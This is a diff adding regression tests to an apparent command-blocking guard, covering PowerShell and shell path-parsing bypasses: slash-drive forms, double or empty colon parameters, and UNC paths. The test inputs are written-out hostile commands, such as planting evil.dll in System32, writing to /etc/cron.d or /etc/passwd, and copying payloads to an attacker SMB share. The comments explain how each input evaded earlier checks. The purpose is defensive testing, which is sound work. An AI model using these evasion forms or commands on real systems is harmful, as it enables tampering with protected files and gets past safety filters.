@@ -435,6 +435,67 @@ describe('F-OP-69: PowerShell colon-syntax -Param:Value (LT)', () => {
     assertNotBlocked('Out-File -FilePath:C:\\Users\\user\\out.txt -InputObject x'));
 });
 
+// ── F-OP-74: unified SENSITIVE_WIN — /C:/windows/... drive-letter-after-slash form ──
+describe('F-OP-74: unified SENSITIVE_WIN must accept /C:/windows/... form (LT)', () => {
+  // Before v1.10.3: D10 (L841) used /^(?:[A-Za-z]:)?\/(windows|...)/i which did NOT
+  // accept leading `/` before drive letter. M7-extended (L930) did. Inputs could pick
+  // the matcher that missed. v1.10.3 unifies via module-level SENSITIVE_PATH_WIN that
+  // accepts all three forms: `C:/windows`, `/windows`, `/C:/windows`.
+  it('blocks Copy-Item src.txt /C:/Windows/System32/evil.dll (D10 must now catch slash-drive form)', () =>
+    assertBlocked('Copy-Item src.txt /C:/Windows/System32/evil.dll'));
+  it('blocks Move-Item -Destination /C:/Windows/System32/evil.dll src.txt', () =>
+    assertBlocked('Move-Item -Destination /C:/Windows/System32/evil.dll src.txt'));
+  it('blocks echo x > /C:/Windows/System32/evil.dll (M7-extended parallel, must stay blocked)', () =>
+    assertBlocked('echo x > /C:/Windows/System32/evil.dll'));
+  // Bare `C:/windows/...` still caught by D10
+  it('blocks Copy-Item -Destination C:/Windows/System32/evil.dll src.txt (bare drive form)', () =>
+    assertBlocked('Copy-Item -Destination C:/Windows/System32/evil.dll src.txt'));
+  // Unix-style `/windows/` still caught
+  it('blocks Copy-Item src.txt /Windows/System32/evil.dll (unix-style root)', () =>
+    assertBlocked('Copy-Item src.txt /Windows/System32/evil.dll'));
+});
+
+// ── F-OP-78: leading-colon token in inlineVal must fail closed (LT) ─────────
+describe('F-OP-78: leading-colon path inputs fail closed in isSensitive (LT)', () => {
+  // Input `-Destination::C:\Windows\…` → colonIdx=12 → inlineVal=':C:\Windows\…'.
+  // Before v1.10.3: normalizePath produced `:C:/Windows/…`; neither SENSITIVE_WIN
+  // (requires /) nor SENSITIVE_NIX (requires /) matched. D10 allowed.
+  it('blocks Copy-Item -Destination::C:\\Windows\\System32\\evil.dll src.txt (double-colon)', () =>
+    assertBlocked('Copy-Item -Destination::C:\\Windows\\System32\\evil.dll src.txt'));
+  it('blocks Copy-Item -D::/etc/cron.d/evil src.txt (double-colon + abbrev)', () =>
+    assertBlocked('Copy-Item -D::/etc/cron.d/evil src.txt'));
+});
+
+// ── F-OP-79: UNC / extended-length path inputs fail closed (LT) ─────────────
+describe('F-OP-79: UNC / extended-length paths fail closed in isSensitive (LT)', () => {
+  // Attacker-controlled SMB share destinations evade SENSITIVE regexes since the
+  // prefix is server-relative, not Unix-root or drive-letter-root. Fail closed.
+  it('blocks Copy-Item src.txt \\\\attacker\\share\\payload.dll (UNC path)', () =>
+    assertBlocked('Copy-Item src.txt \\\\attacker\\share\\payload.dll'));
+  it('blocks Copy-Item -Destination //attacker/share/payload.dll src.txt (forward-slash UNC)', () =>
+    assertBlocked('Copy-Item -Destination //attacker/share/payload.dll src.txt'));
+  it('blocks cp src //attacker/share/payload (forward-slash UNC via cp)', () =>
+    assertBlocked('cp src //attacker/share/payload'));
+});
+
+// ── F-OP-72: empty colon-inline -Destination: falls through to positional (LT) ──
+describe('F-OP-72: empty colon-inline param must not short-circuit sensitive-path check (LT)', () => {
+  // Before v1.10.3: inlineVal='' made dest='' which failed both `dest === undefined`
+  // and `if (dest && ...)`, skipping isSensitive entirely and leaving the real
+  // sensitive path in rest[j+1] unchecked.
+  it('blocks Copy-Item -Destination: C:\\Windows\\System32\\evil.dll src.txt', () =>
+    assertBlocked('Copy-Item -Destination: C:\\Windows\\System32\\evil.dll src.txt'));
+  it('blocks Copy-Item -D: /etc/cron.d/evil src.txt (abbrev + empty colon)', () =>
+    assertBlocked('Copy-Item -D: /etc/cron.d/evil src.txt'));
+  it('blocks Out-File -LiteralPath: C:\\Windows\\System32\\evil.dll -InputObject x', () =>
+    assertBlocked('Out-File -LiteralPath: C:\\Windows\\System32\\evil.dll -InputObject x'));
+  it('blocks Set-Content -Path: /etc/passwd -Value x', () =>
+    assertBlocked('Set-Content -Path: /etc/passwd -Value x'));
+  // Benign empty-colon followed by non-sensitive positional must still allow
+  it('allows Copy-Item -Destination: C:\\Users\\user\\out.txt src.txt (benign empty-colon)', () =>
+    assertNotBlocked('Copy-Item -Destination: C:\\Users\\user\\out.txt src.txt'));
+});
+
 // ── F-OP-70: N/A — VPS only; see VPS review ──────────────────────────────
 
 // ── F-OP-66: M7-extended no-.. redirect bypass (LT) ──────────────────────
